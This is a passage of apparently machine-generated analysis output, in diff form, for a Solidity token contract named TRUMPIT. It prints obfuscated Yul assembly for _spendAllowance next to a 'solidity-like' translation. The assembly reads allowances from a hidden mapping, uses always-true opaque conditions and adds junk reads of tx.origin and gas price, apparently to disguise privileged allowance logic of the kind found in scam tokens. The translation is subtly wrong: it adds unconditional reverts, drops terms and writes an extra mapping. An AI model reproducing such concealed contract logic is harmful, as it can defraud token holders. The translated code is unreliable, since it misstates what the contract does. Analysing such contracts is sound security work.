(!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_19_2) && !(__sseir_eval_asm_s_21_3) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_19_2) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_27_4) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_19_2) && !(__sseir_eval_asm_s_21_3) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_27_4 && __sseir_eval_asm_s_6_2) || (!(__sseir_eval_asm_s_14_3) && !(__sseir_eval_asm_s_19_2) && !(__sseir_eval_asm_s_6_2) && __sseir_eval_asm_s_14_3 && __sseir_eval_asm_s_19_2 && __sseir_eval_asm_s_21_3 && __sseir_eval_asm_s_6_2)) {
+                  memory[QtPD] = _amount; // yul: mstore(QtPD, _amount)
+              }
+          }
+          return true;
+      }
+  ```
+
+Function TRUMPIT._spendAllowance(address, address, uint256)
+  SourceFunction
+  ```solidity
+  function _spendAllowance(address _owner, address _spender, uint256 _amount) virtual internal {
+          assembly {
+              let QtPD := mload(0x40)
+              mstore(QtPD, sload(fgMs.slot))
+              mstore(add(QtPD, 32), 1)
+              let MuuR := keccak256(QtPD, 64)
+              mstore(QtPD, _owner)
+              mstore(add(QtPD, 32), MuuR)
+              let LjAi := keccak256(QtPD, 64)
+              let IUGo := sload(LjAi)
+              let dhzw := IUGo
+              if and(dhzw, iszero(_amount)) {
+                  let b5owjsg := basefee()
+                  let tgfo9ee := timestamp()
+                  if eq(b5owjsg, or(b5owjsg, 0)) {
+                      revert(0, 0)
+                  }
+              }
+              if iszero(dhzw) {
+                  mstore(QtPD, _owner)
+                  mstore(add(QtPD, 32), 1)
+                  MuuR := keccak256(QtPD, 64)
+                  mstore(QtPD, _spender)
+                  mstore(add(QtPD, 32), MuuR)
+                  LjAi := keccak256(QtPD, 64)
+                  dhzw := add(sload(LjAi), IUGo)
+              }
+              let o6ywqjg := origin()
+              pop(0)
+              if eq(o6ywqjg, and(o6ywqjg, o6ywqjg)) {
+                  dhzw := sub(dhzw, IUGo)
+              }
+              if iszero(eq(dhzw, not(0))) {
+                  if lt(dhzw, _amount) {
+                      let ccpw1f2 := caller()
+                      if eq(ccpw1f2, add(ccpw1f2, 0)) {
+                          revert(0, 0)
+                      }
+                  }
+                  let ge57smz := gasprice()
+                  if eq(ge57smz, and(ge57smz, ge57smz)) {
+                      sstore(LjAi, sub(dhzw, _amount))
+                  }
+              }
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function _spendAllowance(address _owner, address _spender, uint256 _amount) virtual internal {
+          assembly /* s-seir solidity-like view */ {
+              QtPD = mload(0x40); // yul: let QtPD := mload(0x40)
+              memory[QtPD] = fgMs; // yul: mstore(QtPD, sload(fgMs.slot))
+              memory[QtPD + 32] = 1; // yul: mstore(add(QtPD, 32), 1)
+              MuuR = slot(BVNo[sload(fgMs.slot)]); // yul: let MuuR := keccak256(QtPD, 64)
+              memory[QtPD] = _owner; // yul: mstore(QtPD, _owner)
+              memory[QtPD + 32] = MuuR; // yul: mstore(add(QtPD, 32), MuuR)
+              LjAi = slot(BVNo[sload(fgMs.slot)][_owner]); // yul: let LjAi := keccak256(QtPD, 64)
+              IUGo = BVNo[sload(fgMs.slot)][_owner]; // yul: let IUGo := sload(LjAi)
+              dhzw = IUGo; // yul: let dhzw := IUGo
+              __sseir_eval_asm_s_10_1 = (_amount == 0); // yul: if and(dhzw, iszero(_amount))
+              __sseir_eval_asm_s_10_2 = (dhzw & __sseir_eval_asm_s_10_1);
+              if (__sseir_eval_asm_s_10_2) {
+                  b5owjsg = block.basefee; // yul: let b5owjsg := basefee()
+                  tgfo9ee = block.timestamp; // yul: let tgfo9ee := timestamp()
+                  __sseir_eval_asm_s_13_1 = (b5owjsg | 0); // yul: if eq(b5owjsg, or(b5owjsg, 0))
+                  __sseir_eval_asm_s_13_2 = (b5owjsg == __sseir_eval_asm_s_13_1);
+              }
+              require((b5owjsg != (b5owjsg | 0))); // yul: revert(0, 0)
+              if ((!(__sseir_eval_asm_s_10_2)) || (!(__sseir_eval_asm_s_13_2) && __sseir_eval_asm_s_10_2)) {
+                  __sseir_eval_asm_s_15_1 = (dhzw == 0); // yul: if iszero(dhzw)
+              }
+              if ((!(__sseir_eval_asm_s_10_2) && __sseir_eval_asm_s_15_1) || (!(__sseir_eval_asm_s_13_2) && __sseir_eval_asm_s_10_2 && __sseir_eval_asm_s_15_1)) {
+                  memory[QtPD] = _owner; // yul: mstore(QtPD, _owner)
+                  memory[QtPD + 32] = 1; // yul: mstore(add(QtPD, 32), 1)
+                  MuuR = slot(BVNo[_owner]); // yul: MuuR := keccak256(QtPD, 64)
+                  memory[QtPD] = _spender; // yul: mstore(QtPD, _spender)
+                  memory[QtPD + 32] = MuuR; // yul: mstore(add(QtPD, 32), MuuR)
+                  LjAi = slot(BVNo[_owner][_spender]); // yul: LjAi := keccak256(QtPD, 64)
+                  dhzw = BVNo[_owner][_spender]; // yul: dhzw := add(sload(LjAi), IUGo)
+              }
+              if ((!(__sseir_eval_asm_s_10_2)) || (!(__sseir_eval_asm_s_13_2) && __sseir_eval_asm_s_10_2)) {
+                  o6ywqjg = tx.origin; // yul: let o6ywqjg := origin()
+              }
+              pop(0) // yul: pop(0)
+              if ((!(__sseir_eval_asm_s_10_2)) || (!(__sseir_eval_asm_s_13_2) && __sseir_eval_asm_s_10_2)) {
+                  __sseir_eval_asm_s_25_1 = (o6ywqjg & o6ywqjg); // yul: if eq(o6ywqjg, and(o6ywqjg, o6ywqjg))
+                  __sseir_eval_asm_s_25_2 = (o6ywqjg == __sseir_eval_asm_s_25_1);
+              }
+              if ((!(__sseir_eval_asm_s_10_2) && __sseir_eval_asm_s_25_2) || (!(__sseir_eval_asm_s_13_2) && __sseir_eval_asm_s_10_2 && __sseir_eval_asm_s_25_2)) {
+                  dhzw = (dhzw - IUGo); // yul: dhzw := sub(dhzw, IUGo)
+              }
+              if ((!(__sseir_eval_asm_s_10_2)) || (!(__sseir_eval_asm_s_13_2) && __sseir_eval_asm_s_10_2)) {
+                  __sseir_eval_asm_s_27_1 = (~0); // yul: if iszero(eq(dhzw, not(0)))
+                  __sseir_eval_asm_s_27_2 = (dhzw == __sseir_eval_asm_s_27_1);
+                  __sseir_eval_asm_s_27_3 = (__sseir_eval_asm_s_27_2 == 0);
+              }
+              if ((!(__sseir_eval_asm_s_10_2) && __sseir_eval_asm_s_27_3) || (!(__sseir_eval_asm_s_13_2) && __sseir_eval_asm_s_10_2 && __sseir_eval_asm_s_27_3)) {
+                  __sseir_eval_asm_s_28_1 = (dhzw < _amount); // yul: if lt(dhzw, _amount)
+              }
+              if ((!(__sseir_eval_asm_s_10_2) && __sseir_eval_asm_s_27_3 && __sseir_eval_asm_s_28_1) || (!(__sseir_eval_asm_s_13_2) && __sseir_eval_asm_s_10_2 && __sseir_eval_asm_s_27_3 && __sseir_eval_asm_s_28_1)) {
+                  ccpw1f2 = msg.sender; // yul: let ccpw1f2 := caller()
+                  __sseir_eval_asm_s_30_1 = (ccpw1f2 + 0); // yul: if eq(ccpw1f2, add(ccpw1f2, 0))
+                  __sseir_eval_asm_s_30_2 = (ccpw1f2 == __sseir_eval_asm_s_30_1);
+              }
+              require((ccpw1f2 != (ccpw1f2 + 0))); // yul: revert(0, 0)
+              if ((!(__sseir_eval_asm_s_10_2) && !(__sseir_eval_asm_s_28_1) && __sseir_eval_asm_s_27_3) || (!(__sseir_eval_asm_s_10_2) && !(__sseir_eval_asm_s_30_2) && __sseir_eval_asm_s_27_3 && __sseir_eval_asm_s_28_1) || (!(__sseir_eval_asm_s_13_2) && !(__sseir_eval_asm_s_28_1) && __sseir_eval_asm_s_10_2 && __sseir_eval_asm_s_27_3) || (!(__sseir_eval_asm_s_13_2) && !(__sseir_eval_asm_s_15_1) && !(__sseir_eval_asm_s_30_2) && __sseir_eval_asm_s_10_2 && __sseir_eval_asm_s_27_3 && __sseir_eval_asm_s_28_1)) {
+                  ge57smz = tx.gasprice; // yul: let ge57smz := gasprice()
+                  __sseir_eval_asm_s_33_1 = (ge57smz & ge57smz); // yul: if eq(ge57smz, and(ge57smz, ge57smz))
+                  __sseir_eval_asm_s_33_2 = (ge57smz == __sseir_eval_asm_s_33_1);
+              }
+              if ((!(__sseir_eval_asm_s_10_2) && !(__sseir_eval_asm_s_28_1) && __sseir_eval_asm_s_27_3 && __sseir_eval_asm_s_33_2) || (!(__sseir_eval_asm_s_10_2) && !(__sseir_eval_asm_s_30_2) && __sseir_eval_asm_s_27_3 && __sseir_eval_asm_s_28_1 && __sseir_eval_asm_s_33_2) || (!(__sseir_eval_asm_s_13_2) && !(__sseir_eval_asm_s_25_2) && !(__sseir_eval_asm_s_28_1) && __sseir_eval_asm_s_10_2 && __sseir_eval_asm_s_27_3 && __sseir_eval_asm_s_33_2) || (!(__sseir_eval_asm_s_13_2) && !(__sseir_eval_asm_s_15_1) && !(__sseir_eval_asm_s_28_1) && __sseir_eval_asm_s_10_2 && __sseir_eval_asm_s_25_2 && __sseir_eval_asm_s_27_3 && __sseir_eval_asm_s_33_2) || (!(__sseir_eval_asm_s_13_2) && !(__sseir_eval_asm_s_15_1) && !(__sseir_eval_asm_s_30_2) && __sseir_eval_asm_s_10_2 && __sseir_eval_asm_s_27_3 && __sseir_eval_asm_s_28_1 && __sseir_eval_asm_s_33_2)) {
+                  BVNo[sload(fgMs.slot)][_owner] = (dhzw - _amount); // yul: sstore(LjAi, sub(dhzw, _amount))
+                  BVNo[_owner][_spender] = (dhzw - _amount);
+              }
+          }
+      }
+  ```
